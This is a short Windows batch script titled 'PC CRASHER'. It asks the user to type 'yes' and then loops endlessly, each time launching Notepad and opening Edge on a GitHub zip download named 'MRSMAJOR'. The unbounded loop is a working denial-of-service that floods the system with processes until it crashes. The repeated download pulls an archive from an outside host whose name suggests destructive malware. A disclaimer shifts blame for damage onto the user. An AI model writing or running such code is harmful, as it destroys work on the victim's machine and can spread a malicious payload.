@echo off
Title PC CRASHER
:start
echo WARNING! THERE IS A 99.9% YOUR PC WILL CRASH AFTER YOU ACCEPT THE PROCESS. BY TYPING YES YOU ARE AGREEING TO THE TOS AND ARE RESPONSIBLE FOR ANY DAMAGES, NOT THE CREATOR.
echo Do you accept the process?
set /p type=
if %type%==yes goto y
if %type%==no goto n

:y

start notepad.exe
start msedge https://github.com/UsefulApi/MRSMAJOR/archive/refs/heads/main.zip

goto y

:n
exit
